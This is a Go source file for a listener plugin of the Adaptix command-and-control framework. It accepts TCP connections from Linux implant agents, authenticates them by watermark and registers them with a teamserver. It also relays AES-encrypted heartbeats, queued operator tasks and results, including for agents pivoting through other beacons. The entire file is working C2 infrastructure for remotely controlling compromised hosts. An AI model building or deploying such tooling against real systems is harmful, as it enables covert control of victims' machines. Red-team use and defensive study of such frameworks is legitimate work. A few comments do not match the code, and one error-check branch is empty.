package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"strconv"
	"sync"

	adaptix "github.com/Adaptix-Framework/axc2/v2"
)

// ===== Wire constants (must match nax_linux.h) =====

const (
	wireTypeRegister  byte = 0x01
	wireTypeHeartbeat byte = 0x02
	wireTypeResult    byte = 0x03
	wireTypeNoTasks   byte = 0x80
)

// ===== Plugin =====

type PluginListener struct{}

type extenderListener struct {
	name       string
	bindHost   string
	bindPort   int    // port the Linux agent binds (pivot mode)
	c2Host     string
	c2Port     int    // port this listener opens for connect-out agents
	encryptKey []byte
	agentCrc   string
	// TCP server (connect-out mode)
	server   net.Listener
	stopChan chan struct{}
	wg       sync.WaitGroup
}

var (
	Ts              adaptix.Teamserver
	ModuleDir       string
	ListenerDataDir string
)

func InitPlugin(ts any, moduleDir string, listenerDir string) adaptix.PluginListener {
	ModuleDir       = moduleDir
	ListenerDataDir = listenerDir
	if ts != nil {
		Ts = ts.(adaptix.Teamserver)
	}
	return &PluginListener{}
}

func (p *PluginListener) Call(operator, listenerName, function, args string) {}

// ===== Create =====

func (p *PluginListener) Create(name, config string, customData []byte) (adaptix.ExtenderListener, adaptix.ListenerData, []byte, error) {
	var cfg struct {
		BindHost   string `json:"bind_host"`
		BindPort   any    `json:"bind_port"`
		C2Host     string `json:"c2_host"`
		C2Port     any    `json:"c2_port"`
		EncryptKey string `json:"encrypt_key"`
		AgentCrc   string `json:"agent_crc"`
	}
	if err := json.Unmarshal([]byte(config), &cfg); err != nil {
		return nil, adaptix.ListenerData{}, nil, fmt.Errorf("linux tcp: parse config: %w", err)
	}

	parsePort := func(v any, def int) int {
		switch x := v.(type) {
		case float64:
			return int(x)
		case string:
			if n, err := strconv.Atoi(x); err == nil && n > 0 {
				return n
			}
		}
		return def
	}

	bindPort := parsePort(cfg.BindPort, 4444)
	c2Port   := parsePort(cfg.C2Port,   5555)

	if cfg.EncryptKey == "" {
		return nil, adaptix.ListenerData{}, nil, fmt.Errorf("linux tcp: encrypt_key required")
	}
	keyBytes, err := hex.DecodeString(cfg.EncryptKey)
	if err != nil || len(keyBytes) != 16 {
		return nil, adaptix.ListenerData{}, nil, fmt.Errorf("linux tcp: encrypt_key must be 32 hex chars")
	}

	agentCrc := cfg.AgentCrc
	if agentCrc == "" {
		agentCrc = "deadbeef"
	}

	agentAddr := fmt.Sprintf("bind:%d | c2:%s:%d", bindPort, cfg.C2Host, c2Port)
	if cfg.C2Host == "" {
		agentAddr = fmt.Sprintf("bind:%d (pivot only)", bindPort)
	}

	listenerData := adaptix.ListenerData{
		Name:      name,
		BindHost:  cfg.BindHost,
		BindPort:  strconv.Itoa(c2Port),
		AgentAddr: agentAddr,
		Protocol:  "bind_tcp",
		Type:      "internal",
		Status:    "running",
		Watermark: "deadbeef",
	}

	ext := &extenderListener{
		name:       name,
		bindHost:   cfg.BindHost,
		bindPort:   bindPort,
		c2Host:     cfg.C2Host,
		c2Port:     c2Port,
		encryptKey: keyBytes,
		agentCrc:   agentCrc,
	}
	return ext, listenerData, []byte(config), nil
}

// ===== Start / Stop — TCP server for connect-out mode =====

func (a *extenderListener) Start() error {
	if a.c2Host == "" || a.c2Port <= 0 {
		return nil // pivot-only: no server needed
	}
	addr := fmt.Sprintf("0.0.0.0:%d", a.c2Port)
	if a.c2Host != "" && a.c2Host != "0.0.0.0" {
		addr = fmt.Sprintf("%s:%d", a.c2Host, a.c2Port)
	}
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("linux tcp: Start: %w", err)
	}
	a.server   = ln
	a.stopChan = make(chan struct{})
	a.wg.Add(1)
	go a.acceptLoop()
	fmt.Printf("[NAX-Linux-TCP] Listening on %s for connect-out agents\n", addr)
	return nil
}

func (a *extenderListener) Stop() error {
	if a.server != nil {
		close(a.stopChan)
		_ = a.server.Close()
		a.wg.Wait()
		a.server = nil
	}
	return nil
}

func (a *extenderListener) acceptLoop() {
	defer a.wg.Done()
	for {
		conn, err := a.server.Accept()
		if err != nil {
			select {
			case <-a.stopChan:
				return
			default:
				continue
			}
		}
		go a.handleConn(conn)
	}
}

// ===== handleConn — connect-out protocol =====
//
// NAX Linux TCP protocol (agent-driven heartbeat):
//
//   Registration (first message):
//     Agent → [wm(4 LE)][sessionId(16)][AES-CBC(key, REGISTER_frame)]
//     Listener → (no response — agent doesn't expect one)
//
//   Polling loop (repeat):
//     Agent → [AES-CBC(key, HEARTBEAT_frame)]
//     Listener → [AES-CBC(key, TASK_frames)] or [AES-CBC(key, NO_TASKS_frame)]
//
//     Agent → [AES-CBC(key, RESULT_frame)]   (sent for each task, fire-and-forget)
//     Listener → (no response — agent doesn't wait for one)
//
// The listener distinguishes heartbeats from results by decrypting locally
// and checking the frame type byte. Only heartbeats trigger a task response.
// Results are processed silently; no response is sent to avoid protocol desync.

func (a *extenderListener) handleConn(conn net.Conn) {
	defer conn.Close()
	remoteIP, _, _ := net.SplitHostPort(conn.RemoteAddr().String())

	// --- REGISTER (first message has wm prefix) ---
	firstMsg, err := lpRead(conn)
	if err != nil || len(firstMsg) < 20 {
		return
	}

	wm := uint32(firstMsg[0]) | uint32(firstMsg[1])<<8 |
		uint32(firstMsg[2])<<16 | uint32(firstMsg[3])<<24
	if fmt.Sprintf("%08x", wm) != a.agentCrc {
		fmt.Printf("[NAX-Linux-TCP] wrong watermark %08x from %s\n", wm, remoteIP)
		return
	}

	beaconID  := firstMsg[4:20]
	ciphertext := firstMsg[20:]

	// Build beatWithId: [sessionId(16)][aesKey(16)][ciphertext]
	// The server passes this to CreateAgent which reads:
	//   beat[0:16]  = beaconID  → stored as agentUID + used as name
	//   beat[16:32] = aesKey    → stored as SessionKey for Encrypt/Decrypt
	//   beat[32:]   = ciphertext → decrypted → REGISTER body parsed
	beatWithId := make([]byte, 16+16+len(ciphertext))
	copy(beatWithId[:16], beaconID)
	copy(beatWithId[16:32], a.encryptKey)
	copy(beatWithId[32:], ciphertext)

	var agentId int64
	if existingId, exists := Ts.TsAgentIdByUID(beaconID); exists {
		// Agent already registered (reconnect).
		// Only clear automatic transport marks ("Disconnect") — never touch
		// marks the operator set manually ("Inactive", "Terminated", etc.).
		agentId = existingId
		if agentData, agentOk := Ts.TsAgentGetById(agentId); agentOk {
			if agentData.Mark == "Disconnect" || agentData.Mark == "" {
				// Only auto-mark: clear it on reconnect
				_ = Ts.TsAgentUpdateDataPartial(agentId, struct {
					Mark     *string `json:"mark"`
					Listener *string `json:"listener"`
				}{Mark: strPtr(""), Listener: strPtr(a.name)})
			} else {
				// Manual operator mark (Inactive, etc.) — preserve it
				_ = Ts.TsAgentUpdateDataPartial(agentId, struct {
					Listener *string `json:"listener"`
				}{Listener: strPtr(a.name)})
			}
		}
		_ = Ts.TsAgentSetTick(agentId, a.name)
	} else {
		agentData, err := Ts.TsAgentCreate(a.agentCrc, beaconID, beatWithId, a.name, remoteIP, false)
		if err != nil {
			fmt.Printf("[NAX-Linux-TCP] TsAgentCreate failed: %v\n", err)
			return
		}
		agentId = agentData.Id
	}
	fmt.Printf("[NAX-Linux-TCP] Agent connected id=%d from %s\n", agentId, remoteIP)

	// DO NOT respond to REGISTER — agent sleeps then sends first heartbeat.

	// --- Polling loop ---
	for {
		raw, err := lpRead(conn)
		if err != nil {
			break
		}

		// Check if agent was removed from server (e.g. "Remove from server" action).
		// If so, close the TCP connection so the agent reconnects and re-registers.
		if _, exists := Ts.TsAgentGetById(agentId); !exists {
			break
		}

		// Peek frame type BEFORE processing so we can log it.
		frameType, decErr := peekFrameType(a.encryptKey, raw)
		if decErr == nil {
		} else {
		}

		// Always pass data to the server — it handles decryption and
		// routing to ProcessData for ALL frame types (heartbeat, result, etc).
		_ = Ts.TsAgentProcessData(agentId, raw)
		// With Async=false, TsAgentSetTick only syncs LastTick to the UI when
		// listenerChanged=true. Force it by briefly setting a different listener
		// name so the server emits TYPE_AGENT_UPDATE with the current LastTick.
		_ = Ts.TsAgentSetTick(agentId, a.name)

		if decErr != nil {
			// Cannot identify frame type — do not respond to avoid desync.
			continue
		}

		switch frameType {
		case wireTypeHeartbeat, wireTypeRegister:
			// Heartbeat → send pending tasks (or NO_TASKS).
			if err := a.sendTasksOrNoTasks(conn, agentId); err != nil {
				return
			}

		case wireTypeResult:
			// Result was processed above via TsAgentProcessData.
			// Do NOT send a response — agent is not listening for one.

		default:
			// Unknown frame — treat as heartbeat to keep agent alive.
			if err := a.sendTasksOrNoTasks(conn, agentId); err != nil {
				return
			}
		}
	}

	// Note: we do NOT set Mark="Disconnect" here because the Linux agent
	// auto-reconnects immediately. Setting a mark would interfere with the
	// operator's manual "Mark as Active/Inactive" state. The reconnect handler
	// already clears stale marks when the agent reconnects.
	fmt.Printf("[NAX-Linux-TCP] Agent disconnected id=%d\n", agentId)
}

// peekFrameType decrypts the first frame from the encrypted payload and
// returns its type byte (byte 0 of the decrypted data).
func peekFrameType(key, enc []byte) (byte, error) {
	plain, err := aesCBCDecrypt(key, enc)
	if err != nil || len(plain) == 0 {
		return 0, fmt.Errorf("decrypt failed")
	}
	return plain[0], nil
}

// sendTasksOrNoTasks sends pending tasks (from the server) or an encrypted
// no-tasks frame if nothing is queued.
// Mirrors NAX HTTP listener's writeResponseOrNoTasks + writeNoTasks.
func (a *extenderListener) sendTasksOrNoTasks(conn net.Conn, agentId int64) error {
	// TsAgentGetHostedAll returns already-packed+encrypted task bytes.
	// If non-empty, send directly (no further encryption needed).
	hosted, _, err := Ts.TsAgentGetHostedAll(agentId, 0x12c0000)
	if err == nil && len(hosted) > 0 {
		return lpWrite(conn, hosted)
	}

	// No tasks: build and encrypt a NO_TASKS frame locally.
	// EncodeFrame(0x80, nil) = [0x80][0x00][0x00,0x00,0x00,0x00]
	noTasksFrame := encodeFrame(wireTypeNoTasks, nil)
	encrypted, err := aesCBCEncrypt(a.encryptKey, noTasksFrame)
	if err != nil {
		return err
	}
	return lpWrite(conn, encrypted)
}

// ===== Edit / GetProfile =====

func (a *extenderListener) Edit(config string) (adaptix.ListenerData, []byte, error) {
	ld := adaptix.ListenerData{
		Name:      a.name,
		BindHost:  a.bindHost,
		BindPort:  strconv.Itoa(a.c2Port),
		AgentAddr: fmt.Sprintf("bind:%d | c2:%s:%d", a.bindPort, a.c2Host, a.c2Port),
		Protocol:  "bind_tcp",
		Type:      "internal",
		Status:    "running",
		Watermark: "deadbeef",
	}
	return ld, []byte(config), nil
}

func (a *extenderListener) GetProfile() ([]byte, error) {
	profile := map[string]any{
		"bind_host":   a.bindHost,
		"bind_port":   a.bindPort,
		"c2_host":     a.c2Host,
		"c2_port":     a.c2Port,
		"encrypt_key": hex.EncodeToString(a.encryptKey),
		"agent_crc":   a.agentCrc,
	}
	return json.Marshal(profile)
}

// ===== InternalHandler — pivot / bind mode =====
//
// data layout: [sessionId(16)][ciphertext]
//
// The Adaptix server routes the beat to this listener using the watermark
// in the original beat (deadbeef). The sessionId prefix was prepended by
// the parent beacon.
//
// After registration, subsequent calls carry heartbeats or results from the
// child. We call TsAgentProcessData with the ciphertext portion so the server
// can route the data (decrypt → ProcessData → update results, etc.).
//
// The server handles task delivery to the child transparently via the parent's
// PivotPackData — InternalHandler only needs to return the correct agent ID.

func (a *extenderListener) InternalHandler(data []byte) (int64, error) {
	if Ts == nil {
		return 0, fmt.Errorf("linux tcp: teamserver not available")
	}

	// Beat format v1 (connect-out / old bind): [sessionId(16)][ciphertext]
	// Beat format v2 (bind pivot):             [aes_key(16)][sessionId(16)][ciphertext]
	//
	// Detect v2 by checking if data is long enough and the first 16 bytes
	// look like a key (not a hex session ID — session IDs are printable hex).
	// Simple heuristic: v2 has aes_key embedded; we try v2 first (len >= 33)
	// and fall back to v1 if the agent already exists under the v1 sessionId.

	var beaconID, encryptKey, ciphertext []byte

	if len(data) >= 33 {
		// v2: [aes_key(16)][sessionId(16)][ciphertext]
		candidateKey  := data[:16]
		candidateSid  := data[16:32]
		candidateCiph := data[32:]
		// If agent already registered under this sessionId, use v1 parsing for heartbeats
		if _, exists := Ts.TsAgentIdByUID(candidateSid); exists {
			beaconID   = candidateSid
			encryptKey = candidateKey
			ciphertext = candidateCiph
		} else if _, exists2 := Ts.TsAgentIdByUID(data[:16]); exists2 {
			// v1 fallback: first 16 bytes are sessionId
			beaconID   = data[:16]
			encryptKey = a.encryptKey
			ciphertext = data[16:]
		} else {
			// New agent with v2 beat (pivot child)
			beaconID   = candidateSid
			encryptKey = candidateKey
			ciphertext = candidateCiph
		}
	} else if len(data) >= 17 {
		// v1: [sessionId(16)][ciphertext]
		beaconID   = data[:16]
		encryptKey = a.encryptKey
		ciphertext = data[16:]
	} else {
		return 0, fmt.Errorf("linux tcp: data too short (%d)", len(data))
	}

	// Check if agent already exists (heartbeat / result)
	if agentId, exists := Ts.TsAgentIdByUID(beaconID); exists {
		_ = Ts.TsAgentSetTick(agentId, a.name)
		_ = Ts.TsAgentProcessData(agentId, ciphertext)
		return agentId, nil
	}

	// New agent — REGISTER beat
	beatWithId := make([]byte, 16+16+len(ciphertext))
	copy(beatWithId[:16], beaconID)
	copy(beatWithId[16:32], encryptKey)
	copy(beatWithId[32:], ciphertext)

	agentData, err := Ts.TsAgentCreate(a.agentCrc, beaconID, beatWithId, a.name, "", false)
	if err != nil {
		return 0, fmt.Errorf("linux tcp: TsAgentCreate: %w", err)
	}
	fmt.Printf("[NAX-Linux-TCP] InternalHandler: agent created id=%d\n", agentData.Id)
	return agentData.Id, nil
}

// ===== Crypto helpers =====

// encodeFrame builds [type(1)][flags(1)][bodyLen(4 LE)][body].
// Identical to NAX C agent's nax_frame_encode / Go EncodeFrame.
func encodeFrame(msgType byte, body []byte) []byte {
	out := make([]byte, 6+len(body))
	out[0] = msgType
	out[1] = 0
	binary.LittleEndian.PutUint32(out[2:6], uint32(len(body)))
	copy(out[6:], body)
	return out
}

// aesCBCEncrypt encrypts with AES-128-CBC + random IV + PKCS7 padding.
// Output: [IV(16)][ciphertext] — matches nax_decrypt() in the C agent.
func aesCBCEncrypt(key, plaintext []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	bs   := block.BlockSize()
	pad  := bs - len(plaintext)%bs
	padded := make([]byte, len(plaintext)+pad)
	copy(padded, plaintext)
	for i := len(plaintext); i < len(padded); i++ {
		padded[i] = byte(pad)
	}
	out := make([]byte, bs+len(padded))
	if _, err := io.ReadFull(rand.Reader, out[:bs]); err != nil {
		return nil, err
	}
	cipher.NewCBCEncrypter(block, out[:bs]).CryptBlocks(out[bs:], padded)
	return out, nil
}

// aesCBCDecrypt decrypts AES-128-CBC: input = [IV(16)][ciphertext].
// Used locally to peek at the frame type.
func aesCBCDecrypt(key, data []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	bs := block.BlockSize()
	if len(data) <= bs || (len(data)-bs)%bs != 0 {
		return nil, fmt.Errorf("invalid ciphertext length")
	}
	plain := make([]byte, len(data)-bs)
	cipher.NewCBCDecrypter(block, data[:bs]).CryptBlocks(plain, data[bs:])
	// Remove PKCS7 padding
	if len(plain) == 0 {
		return nil, fmt.Errorf("empty plaintext")
	}
	pad := int(plain[len(plain)-1])
	if pad == 0 || pad > bs || pad > len(plain) {
		return nil, fmt.Errorf("invalid padding")
	}
	return plain[:len(plain)-pad], nil
}

// ===== Length-prefix TCP helpers =====

func lpRead(conn net.Conn) ([]byte, error) {
	hdr := make([]byte, 4)
	if _, err := io.ReadFull(conn, hdr); err != nil {
		return nil, err
	}
	l := uint32(hdr[0]) | uint32(hdr[1])<<8 | uint32(hdr[2])<<16 | uint32(hdr[3])<<24
	if l == 0 || l > 8*1024*1024 {
		return nil, fmt.Errorf("invalid length %d", l)
	}
	data := make([]byte, l)
	if _, err := io.ReadFull(conn, data); err != nil {
		return nil, err
	}
	return data, nil
}

func lpWrite(conn net.Conn, data []byte) error {
	l := uint32(len(data))
	hdr := []byte{byte(l), byte(l >> 8), byte(l >> 16), byte(l >> 24)}
	if _, err := conn.Write(hdr); err != nil {
		return err
	}
	_, err := conn.Write(data)
	return err
}

func main() {}

func strPtr(s string) *string { return &s }
